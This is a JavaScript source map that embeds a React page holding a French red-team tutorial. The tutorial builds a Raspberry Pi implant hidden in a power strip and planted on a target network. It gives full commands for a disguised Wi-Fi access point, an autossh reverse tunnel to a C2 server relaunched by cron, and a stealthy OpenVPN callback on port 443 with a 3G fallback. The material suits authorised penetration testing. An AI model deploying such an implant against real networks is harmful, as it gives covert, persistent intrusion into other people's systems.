AC,mDAAR;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,kCAAtB,8EA3XF,EA8XE;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,4TA9XF,EAiYE;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,6BAAqB;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,oBAArB,yDAC2B;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,2BAD3B,0EAE8D;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MAF9D,EAEmE;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MAFnE,gCAI0B;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,eAJ1B,iIAKA;AAAA;AAAA;AAAA;AAAA;AAAA;AAAA,MALA,m5DAjYF,CADF;AAsbD;;AAxbiC;;AA2bpC,eAAeG,OAAf","sourcesContent":["import React from 'react';\r\nimport Hide from \"../img/hide_raspberry.jpg\"\r\nimport Methodo from \"../img/methodo.jpg\"\r\nimport KaliRaspberry from \"../img/kali_raspberry.png\"\r\n\r\n\r\nclass Redteam extends React.Component {\r\n    render() {\r\n      return (\r\n        <div className=\"article\">\r\n\r\n        <h1>Redteam</h1>\r\n   \r\n        <hr/>\r\n        <p className=\"tabulation\">Une nouvelle tendance émerge du côté des attaques informatiques, les techniques d’intrusion se professionnalisent, s’industrialisent et s’étendent dans le temps. Là où des « amateurs » n’avaient qu’à exécuter un script sur un système vulnérable autrefois, des équipes expérimentées peuvent passer des mois sur une seule et même cible aujourd’hui, <strong>APT (Advanced Persitent Threat).</strong><br/><br/>\r\n\r\n        Pour s'adapter les entreprises de sécurité propose depuis peu une nouvelle approche dans la réalisation d’un test d’intrusion : L’approche <strong>RedTeam</strong>. Dans cette approche, l’objectif de l’équipe attaquante est de passer d'une position de personne extérieure à l’entreprise jusqu’à la réalisation d’une ou plusieurs actions critiques au sein du SI ciblé. Par rapport à un pentest il s'agit généralement d'une mission d'une durée beaucoup plus longue et avec plus de techniques possibles (ex: phishing, intrusion physique).    \r\n        </p>\r\n\r\n        <br/>\r\n        <br/>\r\n\r\n        <h2>Contexte</h2>\r\n        <p className=\"tabulation\">L'objectif de notre projet de Redteam est de créer un implant qui une fois sur le réseau d'un client se reconnecterait automatiquement à notre serveur interne, avec à disposition toute la boite à outils de pentest. Cela représenterait la phase de compromission initiale dans le schéma de redteam suivant: <br/>\r\n        <img id=\"methodoredteam\" src={Methodo} alt=\"méthodologie redteam\"/>\r\n        <br/>  \r\n\r\n        Un scénario de Redteam possible serait de pénétrer dans une société cliente en se déguisant et de placer l'implant sur le réseau, afin d'obtenir à distance un accès à leur réseau via une connexion OpenVPN ou un tunnel SSH inversé.<br/><br/>  \r\n\r\n        Des outils tels que <strong>la LAN Turtle</strong> existent déjà mais l'on souhaiterait avoir le contrôle total de nos outils. Plusieurs méthodes doivent être implémentées au cas où le pare-feu du client bloquerait certains flux sortants. L'implant doit également avoir une méthode alternative pour se connecter au cas où leurs règles de pare-feu bloqueraient le trafic, une configuration sans fil pour l'appareil est donc à envisager.\r\n        </p>\r\n\r\n        <img id=\"kaliraspberry\" src={KaliRaspberry} alt=\"kali raspberry\"/>\r\n\r\n        <h2>Cahier des charges de la box</h2>\r\n        <div>\r\n        Plusieurs appareils peuvent convenir, les critères principaux étant sa fiabilité, sa légèreté, sa taille, sa rapidité et son coût:\r\n            <ul>\r\n                <li>l'appareil doit être <strong>petit</strong> (facile à dissimuler)</li>\r\n                <li>possibilité d'utiliser un <strong>tunnel SSH inverse persistant</strong> et/ou <strong>OpenVPN</strong> pour le C&C</li>\r\n                <li>espace de <strong>stockage</strong> (au moins 32 Go)</li>\r\n                <li>matériel <strong>rapide</strong></li>\r\n                <li><strong>faible coût</strong> (en cas de destruction ou de vol)</li>\r\n                <li>possibilité d'ajouter des modules pour la <strong>connexion sans fil</strong></li>\r\n            </ul>\r\n        Il existe de nombreux appareils comme le Hardkernel ODROID-N2, ou encore le Beaglebone Black mais pour le prix la simplicité et les autres critères, on préférera utiliser la <strong>Raspberry Pi 4.</strong></div>\r\n\r\n        <br/>\r\n\r\n        <h2>Shopping list pour le matériel</h2>\r\n        <div>\r\n          <ul>\r\n            <li><a href=\"https://www.canakit.com/raspberry-pi-4-starter-kit.html\">Raspberry Pi 4 Model B with 4GB RAM (Basic Kit) - $100</a></li>\r\n            <li><a href=\"https://www.amazon.com/dp/B07FCMBLV6\">SanDisk 64GB Extreme microSDXC UHS-I Memory Card - $15</a></li>\r\n            <li><a href=\"https://vilros.com/collections/raspberry-pi-accessories/products/vilros-raspberry-pi-4-compatible-clear-transparent-case-with-built-in-fan\">Raspberry Pi 4 Case with Fan - $10 (optional)</a></li>\r\n            <li><a href=\"https://www.amazon.com/gp/product/B01KWQAQ00/ref=ppx_yo_dt_b_asin_title_o00_s00?ie=UTF8&psc=1\">Wireless WiFi USB Dongle Stick Adapter RT5370 150Mbps - $9 (optional)</a></li>\r\n          </ul>\r\n        </div>\r\n\r\n        <br/>\r\n\r\n        <h2>Système d'exploitation</h2>\r\n        <p className=\"tabulation\">Comme système d'exploitation, on retiendra la distribution <strong>Kali Linux</strong> car elle possède déjà beaucoup d'outils de pentest, pas besoin d'installation et c'est simple à utiliser pour tous les pentesters.</p>\r\n        \r\n        <br/>\r\n\r\n        <h2>Wifi</h2>\r\n        <p className=\"tabulation\">La Raspberry Pi 4 dispose déjà d'une carte sans fil intégrée (sans fil 2,4 GHz et 5,0 GHz IEEE 802.11ac), et gère l'<strong>injection de paquets</strong> et <strong>le mode moniteur</strong> (contrairement à la Pi 3). Un autre adaptateur sans fil permettrait d'avoir une meilleure portée lors d'attaques sans fil.\r\n\r\n        Un adaptateur sans fil doté d'un chipset RT5370 serait un bon choix, en plus de prendre en charge le mode moniteur, et l'injection de paquets avec des outils comme <strong>Aireplay-ng</strong>, il a une large bande de fréquences utilisables. Ainsi on peut se connecter à un adaptateur via <strong>hostapd</strong>et utiliser l'autre adaptateur afin de réaliser les attaques.</p>\r\n        \r\n        <br/>\r\n\r\n        <h2>Comment dissimuler la Raspberry ?</h2>\r\n        <p>L'une des méthodes la plus simple et efficace est de la cacher à l'intérieur d'une multiprise comme suit :</p>\r\n        <img id=\"hide_raspberry\" src={Hide} alt=\"idée pour chacher raspberry\"/>\r\n\r\n        <hr/>\r\n\r\n        <h2>Configuration initiale</h2>\r\n        <div>Les différentes étapes:\r\n          <ol>\r\n            <li>Configurer l'image Kali pour la carte MicroSD</li>\r\n            <li>Configurer un point d'accès WiFi avec hostapd</li>\r\n            <li>Configurer un tunnel SSH inverse automatique</li>\r\n            <li>Configurer le client et le serveur OpenVPN</li>\r\n          </ol>\r\n        </div>\r\n        <h3>Installation de Kali Linux</h3>\r\n        <a href=\"https://www.offensive-security.com/kali-linux-arm-images/#1493408272250-e17e9049-9ce8\">Kali Linux</a>\r\n\r\n        <br/>\r\n        <br/>\r\n\r\n        <div>\r\n          <h4>Pour Windows</h4>\r\n          Avec un adaptateur microSD vers USB connectez la carte MicroSD à votre système Windows.<br/>\r\n          Décompressez l'archive.<br/>\r\n          Utilisez Win32DiskImager ou Rufus pour écrire l'image disque Kali sur la carte MicroSD.<br/>\r\n\r\n          <br/> \r\n\r\n          <h4>Pour Linux</h4>\r\n          Avec un adaptateur MicroSD vers USB connectez la carte MicroSD au système Linux.<br/>\r\n          Utilisez la commande <strong>dd</strong> pour créer une image du fichier Kali sur la carte MicroSD.<br/>\r\n\r\n          <br/>\r\n\r\n          <h4>Installation</h4>\r\n          Mettez la Raspberry sous secteur, branchez un clavier et un écran avec un câble HDMI et connectez-vous à Kali Linux avec le nom d'utilisateur \"root\" et le mot de passe \"toor\".<br/>\r\n          Veillez à connecter un câble Ethernet sur la Raspberry Pi 4 pour l'accès internet, elle devrait alors automatiquement récupérer une adresse IP via DHCP.\r\n          \r\n        </div>\r\n\r\n        <br/>\r\n\r\n        <h3>Configurer un point d'accès wifi avec hostpad</h3>\r\n        <div id=\"wifi\">apt-get install hostapd <br/>\r\n        apt-get install pciutils<br/>\r\n\r\n        nano /etc/network/interfaces<br/><br/>\r\n        ##Le fichier /etc/network/interfaces devrait ressembler à:<br/>\r\n\r\n        auto lo<br/>\r\n        iface lo inet loopback<br/>\r\n        auto eth0<br/>\r\n        iface eth0 inet dhcp<br/>\r\n        auto wlan0<br/>\r\n        allow-hotplug wlan0<br/>\r\n        iface wlan0 inet static<br/>\r\n        address 172.16.66.1<br/>\r\n        netmask 255.255.255.0<br/>\r\n        gateway 172.16.66.1<br/>\r\n        \r\n        <br/>\r\n\r\n        ##Install a DHCP server that will serve WiFi clients:<br/><br/>\r\n\r\n        apt-get install udhcpd<br/>\r\n\r\n        nano /etc/udhcpd.conf<br/><br/>\r\n        ##Add the following to the end of the file:<br/><br/>\r\n\r\n        start           172.16.66.50<br/>\r\n        end             172.16.66.70<br/>\r\n        interface       wlan0<br/>\r\n        # Optional<br/>\r\n        opt     dns     1.1.1.1<br/>\r\n        option  subnet  255.255.255.0<br/>\r\n        opt     router  172.16.66.1<br/>\r\n        option  domain  local<br/>\r\n        <br/>\r\n        ##Create a file for udhcpd.leases:<br/><br/>\r\n\r\n        touch /var/lib/misc/udhcpd.leases<br/>\r\n        ##Edit the /etc/default/udhcpd file <br/>and change the DHCPD_ENABLED=”no” to “yes”:<br/><br/>\r\n\r\n        DHCPD_ENABLED=”yes”<br/>\r\n        ##Create the file /etc/hostapd/hostapd.conf<br/><br/>\r\n\r\n        nano /etc/hostapd/hostapd.conf<br/>\r\n        ##Copy the following into the hostapd.conf file :<br/><br/>\r\n\r\n        # Interface configuration<br/>\r\n        interface=wlan0<br/>\r\n        ssid=iphone10<br/>\r\n        channel=6<br/><br/>\r\n\r\n        # WPA Configuration<br/>\r\n        macaddr_acl=0<br/>\r\n        auth_algs=1<br/>\r\n        ignore_broadcast_ssid=0<br/>\r\n        wpa=2<br/>\r\n        wpa_passphrase=SuperSecretSquirrel<br/>\r\n        wpa_key_mgmt=WPA-PSK<br/>\r\n        rsn_pairwise=CCMP<br/>\r\n\r\n        #Hardware Configuration<br/>\r\n        driver=nl80211<br/>\r\n        ieee80211n=1<br/>\r\n        hw_mode=g<br/>\r\n        wmm_enabled=1<br/><br/>\r\n\r\n\r\n        nano /etc/init.d/hostapd<br/>\r\n        ##Change the line to the following:<br/><br/>\r\n\r\n        DAEMON_CONF=/etc/hostapd/hostapd.conf<br/><br/>\r\n\r\n        nano /etc/default/hostapd<br/>\r\n        ##Change the line to the following:<br/><br/>\r\n\r\n        DAEMON_CONF=\"/etc/hostapd/hostapd.conf\"\r\n\r\n        update-rc.d hostapd enable\r\n        ##Now, we need to enable IP forwarding in the kernel for forwarding packets for our client devices to the Internet:<br/><br/>\r\n\r\n        sysctl -w net.ipv4.ip_forward=1<br/><br/>\r\n\r\n        nano /etc/sysctl.conf<br/>\r\n        [Remove the “#” in front of net.ipv4.ip_forward=1]<br/><br/>\r\n\r\n        Finally, use your IPTables-magic to masquerade client connections to the Internet:<br/><br/>\r\n\r\n        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE<br/>\r\n        There is a package available in Kali to make these changes to IPTables last.<br/><br/>\r\n\r\n        apt-get install iptables-persistent<br/>\r\n        iptables-save > /etc/iptables/rules.v4<br/><br/>\r\n        ##To ensure the iptables rules get loaded before the network interface at boot, we will create a short script in the /etc/network/if-pre-up.d/ directory:<br/><br/>\r\n\r\n        nano /etc/network/if-pre-up.d/iptables<br/>\r\n        Add the following code to the above /etc/network/if-pre-up.d/iptables file, then save:<br/><br/>\r\n\r\n        #!/bin/bash<br/>\r\n        /usr/sbin/iptables-restore {'<'} /etc/iptables/rules.v4<br/><br/>\r\n\r\n        chmod +x /etc/network/if-pre-up.d/iptables<br/>\r\n\r\n        reboot<br/>\r\n        ##You should now see a wireless network named “iphone10” (or whatever named you use)<br/> where you can connect to it with your wpa_passphrase you set earlier. You<br/> should also have Internet too assuming your Raspberry Pi 4 has Internet. Once<br/> connected, you can also SSH into your Raspberry Pi 4.\r\n        </div>\r\n\r\n        <h3>Configurer un tunnel reverse shell automatique</h3>\r\n        <p>Cette section suppose que vous disposez d'un serveur de commande et de contrôle accessible sur Internet et que SSH est activé sur le serveur.</p>   \r\n\r\n        <div id=\"wifi\">\r\n        apt-get install autossh <br/>\r\n        ssh-keygen [Leave all of the settings default] <br/><br/>\r\n\r\n        scp /root/.ssh/id_rsa.pub root@[C2 IP Address]:/directory/on/C2<br/>\r\n\r\n\r\n        Append the contents of id_rsa.pub to ~/.ssh/authorized_keys or create this file on the C2 server:<br/>\r\n\r\n        [On the C2 server]\r\n\r\n        cat /directory/to/upload/to/id_rsa.pub >> ~/.ssh/authorized_keys<br/>\r\n\r\n        [On the RASPBERRY Pi 4]<br/>\r\n\r\n        ssh root@[C2 IP address]<br/>\r\n        Test “autossh”:<br/>\r\n\r\n        autossh -M 11166 -i /root/.ssh/id_rsa -R 6667:localhost:22 root@[C2 IP Address]<br/>\r\n        If you login to your VPS/C2 server, you should now see port 6667 present after you run a “netstat -antp” command.<br/>\r\n\r\n        To have the autossh start at boot, we will create a cronjob that points to a script. First we will create a bash script for our autossh file:<br/>\r\n\r\n        nano /bin/autossh-connect.sh<br/>\r\n        Then we place the autossh command inside the autossh-connect.sh file:<br/><br/>\r\n\r\n        #!/bin/bash<br/>\r\n        autossh -M 11166 -N -f -o “PubkeyAuthentication=yes” -o “PasswordAuthentication=no” <br/>-i /root/.ssh/id_rsa -R 6667:localhost:22 root@[Your C2 Server IP] &<br/><br/>\r\n\r\n        -N: Do not execute a command on the middleman machine<br/>\r\n        -f: Drop in the background<br/>\r\n        &: Execute this command but do not wait for output or an exit code. If this is not added, your machine might hang at boot<br/>\r\n\r\n        For the cronjob creation, type the following command:<br/>\r\n\r\n        crontab -e<br/>\r\n        At the bottom of the script (no “#” should be in front of what you are typing), add the following:<br/><br/>\r\n\r\n        @reboot sleep 5 && /bin/autossh-connect.sh > /dev/null 2>&1<br/>\r\n        */5 * * * * /bin/autossh-connect.sh > /dev/null 2>&1<br/>\r\n        This tells the cron job after reboot to wait 5 seconds and run the <br/>autossh-connect.sh script which will start the autossh process. <br/>\r\n        \r\n        The 5 seconds was added to ensure the network manager has started first. The “> /dev/null 2>&1” part ensures that no logs are written out to any files as to not take up space. On the second line, the cron job will also try and run every 5 minutes. This is due in case the autossh job gets disconnected or fails for whatever reason.<br/><br/>\r\n\r\n        That’s it. Now when your Raspberry Pi 4 starts, it should autossh to your C2 server which will create a local port of 6667 on the C2 server. When you SSH from your attacker system onto the C2 server, you can run the following command on your C2 server to get access to your Raspberry Pi 4 device:<br/><br/>\r\n\r\n        ssh localhost -p 6667 [This is ran on the C2 server]\r\n\r\n        </div>      \r\n        \r\n        <h3>Configurer un client et un serveur Openvpn</h3>\r\n        <p className=\"tabulation\">En plus du reverse shell SSH pour accéder à notre Raspberry, il serait également intéressant de configurer l'appareil pour utiliser une connexion OpenVPN inversée sur le port 443 (HTTPS). \r\n        <br/><br/>\r\n        Étant donné que la Raspberry sera probablement déposée à l'arrière d'un switch dans une entreprise, nous ne pourrons pas nous y connecter directement. Par conséquent, la Raspberry doit d'abord sortir par le port 443 vers notre serveur OpenVPN Access Server. Depuis notre machine d'attaque nous devrons également nous connecter au serveur VPN. Cela est une assurance du fait que si le client bloque le port 22 sortant pour SSH, nous aurons une autre option pour se connecter via le port 443 (HTTPS).\r\n        </p>\r\n\r\n        <p>Il faut pour cela réaliser les 3 étapes suivantes :</p>\r\n        <ul>\r\n          <li>Configuration d'OpenVPN Access Server sur Internet</li>\r\n          <li>Configuration de la Raspberry</li>\r\n          <li>Configuration de la machine d'attaque</li>\r\n        </ul>\r\n\r\n        <br/>\r\n\r\n        <h3>Mise en place OpenVPN Access Server</h3>\r\n        <p className=\"tabulation\">Pour la solution d'hébergement de notre serveur VPN on peut opter pour un serveur VPS car ils sont extrêmement faciles et rapides à configurer.<br/>\r\n\r\n        <strong>Vultr.com </strong>et <strong>Amazon Lightsail</strong> sont deux fournisseurs de VPS rapides, bon marché et simples à configurer. L'autre raison de choisir ces fournisseurs VPS est que le réseau de la victime aura souvent beaucoup de trafic vers les serveurs AWS, cela permet donc d'être plus discret. \r\n        </p>\r\n\r\n        <ol>\r\n          <li>Allez sur https://aws.amazon.com/lightsail/ et créez un nouveau VPS</li>\r\n\r\n          Une fois crée, allez sur Manage -> Networking\r\n\r\n          Ajoutez 2 règles firewall sur les ports (443 et 943)\r\n\r\n          <li>Installez un OS, par exemple Ubuntu. Faire un chmod 600 de la SSH key et se connectez sur le VPS server à partir de la machine d'attaque : </li>\r\n          ssh -i LightsailDefaultPrivateKey-us-west-2.pem user@[IP]\r\n          sudo su -\r\n          <li>Update le serveur:</li>\r\n          apt-get update && apt-get upgrade\r\n          <li><a href=\"https://openvpn.net/vpn-software-packages/\">Installez OpenVPN AS</a></li>\r\n\r\n          <li>Copiez le lien et téléchargez-le, par exemple:</li>\r\n          wget https://openvpn.net/downloads/openvpn-as-latest-ubuntu18.amd_64.deb\r\n          <li>Installez OpenVPN AS</li>\r\n          dpkg -i openvpn-as-latest-ubuntu18.amd_64.deb\r\n          <li>Supprimez le profil actuel et configurez OpenVPN:</li>\r\n          /usr/local/openvpn_as/bin/ovpn-init\r\n          <li>Tapez DELETE: (sensible à la casse)</li>\r\n          <li>Finir l'installation comme suit</li>\r\n        </ol>\r\n        <p>Accept EULA: yes <br/>\r\n          Will this be the primary Access Server node: yes <br/>\r\n          Please specify the network interface and IP address to be <br/>\r\n          used by the Admin Web UI: <br/>\r\n          (1) all interfaces: 0.0.0.0 <br/>\r\n          (2) eth0: 45.77.217.54 <br/>\r\n          Answer: 1 <br/>\r\n          Please specify the port number for the Admin Web UI. <br/>\r\n          Answer: 943 <br/>\r\n          Should client traffic be routed by default through the VPN? <br/>\r\n          Answer: YES <br/>\r\n          Should client DNS traffic be routed by default through the VPN? <br/>\r\n          Answer: YES <br/>\r\n          Use local authentication via internal DB? <br/>\r\n          > Press ENTER for default [no]:  <br/>\r\n          Answer: YES <br/>\r\n          The rest of these answers should be default. Simply hit the 'Enter' key <br/>\r\n          Change OpenVPN Admin password: <br/>\r\n          passwd openvpn supersecretpassword123 [Set your own unique password here] <br/>\r\n          [Note - This is a great time to put IPTables for port 943 to only allow connections from your networks.]</p>\r\n\r\n          <br/>\r\n\r\n          <h3>Configuration de OpenVPN AS Server</h3>\r\n\r\n          <ol>\r\n            <li>Allez sur https://[IP Address du serveur VPS]:943/admin/</li>\r\n            <li>Se connecter avec le compte \"openvpn\" et le mot de passe récemment crée <br/>\r\n            Note: Si vous utilisez AWS Lightsail, assurez-vous dans les paramètres que le nom d'hôte ou l'adresse IP est l'adresse IP publique et non la privée, puis enregistrez et mettez à jour.</li>\r\n            <li>Dans OpenVPN, vérifiez que l'authentification est définie sur locale: <br/>\r\n            Authentication -> General -> Set to Local (On) -> Save Settings -> Update Server</li>\r\n            <li>Créez deux utilisateurs avec l'option `Autoriser la connexion automatique activée` (rasp4 and redteam). Allez sur User Management -> User Permissions<br/>\r\n            Pour chaque utilisateur:<br/>\r\n            Set AllowAuto-login</li>\r\n            <li>Pour que les 2 comptes permettent la connectivité via VPN, nous devons activer certaines autorisations. Assurez-vous d'activer les autorisations de l'utilisateur:<br/>\r\n            All server-side private subnets<br/>\r\n            All other VPN clients</li>\r\n          </ol>\r\n\r\n          <br/>\r\n          <h3>Télécharger les profils OpenVPN</h3>\r\n          <ol>\r\n            <li>Se connecter et télécharger les profils https://[Your VPS]:943/?src=connect</li>\r\n            <li>Pour chaque utilisateur se connecter et télécharger le profil</li>\r\n            <li>Sauvegarder rasp4.ovpn et redteam.ovpn</li>\r\n          </ol>\r\n\r\n          <br/>\r\n\r\n          <h3>Configuration de la Raspberry Pi 4</h3>\r\n          <li>Allumez la Raspberry Pi 4 et branchez un câble ethernet</li>\r\n          <li>Installez OpenVPN: apt-get install openvpn</li>\r\n          <li>Configurez le démarrage automatique de OpenVPN dans le fichier :<br/>\r\n          nano /etc/default/openvpn <br/>\r\n          [Décommentez ‘AUTOSTART=”all”’]</li>\r\n          <li>Copiez le fichier .ovpn sur la Raspberry :<br/>scp rasp4.ovpn [Raspberry Pi 4 IP]:/etc/openvpn</li>\r\n          <li>Allez dans /etc/openvpn et renommez rasp4.ovpn en client.conf: <br/>cd /etc/openvpn <br/>mv rasp4.ovpn client.conf</li>\r\n          <li>Activez OpenVPN pour démarrer au boot: <br/>update-rc.d openvpn enable</li>\r\n          <li>Puis reboot</li>\r\n\r\n          <p className=\"tabulation\">Cela va lancer le client OpenVPN sur la Raspberry Pi 4. Pour vous assurer que cela fonctionne, retournez dans votre serveur OpenVPN AS et vérifiez les connexions. Accédez à \"Utilisateurs actuels\" dans le menu État et vous devriez voir le nom d'utilisateur \"rasp4\" avec l'adresse réelle comme adresse WAN externe de l'endroit où la Raspberry Pi 4 est branchée et une adresse VPN. <br/><br/>\r\n          \r\n          Nous avons à présent la Raspberry Pi 4 configurée de sorte que dès lors qu'elle se connecte à un réseau, elle va chercher à se reconnecter à notre serveur VPN.</p>\r\n\r\n          <br/>\r\n\r\n          <h3>Configuration GSM pour la box</h3>\r\n\r\n          <p>Lien pour dongle : <a href=\"http://shop.mchobby.be/product.php?id_product=677\">dongle GSM (23,60€)</a> Module/modem 3G HSDPA, interface USB, support SMS et connexion internet.</p>\r\n\r\n\r\n          <p>Ce module permet d'établir des connexions Internet via le réseau 3G... et d'obtenir une connexion Internet là où vous ne disposez pas d'ADSL, de ligne téléphonique classique, ou de WiFi.\r\n          Avant de brancher la clef USB à la Raspberry, il faut se rendre dans le fichier de configuration :</p>\r\n\r\n          <p>Editer le fichier <strong>config.txt</strong> dans le dossier /boot/\r\n          Ajouter la ligne suivante: <strong>max_usb_current=1</strong>\r\n          Après reboot, vous pouvez brancher la clef USB à la Raspberry <br/><br/>\r\n\r\n          Si vous tapez la commande <strong>lsusb</strong> vous devriez la voir dans la liste. Sinon il faut procéder à la vérification du matériel et de la connectique.\r\n          <br/>\r\n\r\n          $ sudo apt-get update\r\n          $ sudo apt-get install ppp wvdial\r\n\r\n          Configuration de wvdial\r\n          Le fichier de configuration de wvdial se trouve dans le dossier /etc/wvdial.conf\r\n\r\n          Nous allons donc l'éditer en tapant la commande: sudo nano /etc/wvdial.conf\r\n\r\n          Le fichier de configuration est un fichier texte comme celui-ci dessous\r\n\r\n          [Dialer Defaults]\r\n          Init1 = ATZ\r\n          Init2 = ATQ0 V1 E1 S0=0 &C1 &D2\r\n          Init3 = AT+CGDCONT=1,\"IP\",\"web.be\"\r\n          Stupid Mode = 1\r\n          Modem Type = Analog Modem\r\n          ISDN = 0\r\n          New PPPD = yes\r\n          Phone = *99#\r\n          Modem = /dev/ttyUSB0\r\n          Username = web\r\n          Password = web\r\n          Baud = 9600\r\n          Notez que les paramètres de connections web.be, web, web sont des paramètres propres à vos opérateurs 3G (web.be, web, web sont les paramètres pour l'opérateur MobileVikings).\r\n\r\n          Pour Mobistar (Orange Belgique)\r\n          A la place de web.be rentrez mworld.be, (business: entrez web.pro.be)\r\n          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = ''\r\n          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = ''\r\n          Pour Proximus\r\n          A la place de web.be rentrez internet.proximus.be\r\n          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = ''\r\n          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = ''\r\n          Pour Base\r\n          A la place de web.be rentrez gprs.base.be\r\n          Dans le champ Nom d’utilisateur, n’entrez rien donc dans le fichier deux ' Username = 'base'\r\n          Dans le champ Mot de passe, n’entrez rien donc dans le fichier deux ' Password = 'base'\r\n\r\n          Une fois wvdial configuré, il suffit de taper la commande sudo wvdial afin de lancer la connexion 3G.\r\n\r\n          Plusieurs informations vont défiler à l'écran dont l'adresse IP publique et les DNS fournis par le FAI.\r\n\r\n          Pour couper la connexion, appuyez simultanément sur les touches CTRL+C. Celle-ci se déconnectera et affichera le temps pendant laquelle la connexion a été maintenue.</p>\r\n      </div>\r\n      );\r\n    }\r\n  }\r\n\r\n  export default Redteam;  "]},"metadata":{},"sourceType":"module"}